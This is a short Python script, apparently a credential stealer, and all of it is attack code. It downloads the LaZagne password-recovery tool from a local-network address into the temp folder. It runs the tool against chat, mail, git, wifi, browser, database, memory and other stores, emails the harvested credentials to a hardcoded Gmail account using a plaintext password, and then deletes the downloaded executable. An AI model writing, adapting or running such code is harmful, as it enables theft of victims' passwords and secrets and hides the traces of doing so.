import requests,subprocess,smtplib,os,tempfile

def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://192.168.0.8/live/laZagne.exe")
result = subprocess.check_output("laZagne.exe chats -v",shell=True)
result = result + subprocess.check_output("laZagne.exe mails -v",shell=True)
result = result + subprocess.check_output("laZagne.exe git -v",shell=True)
result = result + subprocess.check_output("laZagne.exe svn -v",shell=True)
result = result + subprocess.check_output("laZagne.exe wifi -v",shell=True)
result = result + subprocess.check_output("laZagne.exe sysadmin -v",shell=True)
result = result + subprocess.check_output("laZagne.exe browsers -v",shell=True)
result = result + subprocess.check_output("laZagne.exe games -v",shell=True)
result = result + subprocess.check_output("laZagne.exe databases -v",shell=True)
result = result + subprocess.check_output("laZagne.exe memory -v",shell=True)
result = result + subprocess.check_output("laZagne.exe php -v",shell=True)
result = result + subprocess.check_output("laZagne.exe maven -v",shell=True)
send_mail("1999rahulreddy@gmail.com","PassWord@1234",result)
os.remove("laZagne.exe")
